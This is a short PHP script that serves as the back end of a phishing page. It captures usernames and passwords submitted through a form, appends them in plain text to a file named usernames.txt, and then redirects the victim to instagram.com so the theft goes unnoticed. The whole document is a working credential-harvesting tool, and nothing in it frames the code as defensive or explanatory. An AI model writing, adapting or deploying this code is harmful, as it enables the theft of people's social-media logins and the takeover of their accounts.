<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    if ($username && $password) {
        file_put_contents("usernames.txt", "Account: " . $username . " Pass: " . $password . "\n", FILE_APPEND);
    } else {
        echo "Username or password is missing.";
    }

    header('Location: https://instagram.com');
    exit();
} else {
    echo "Invalid request method.";
}
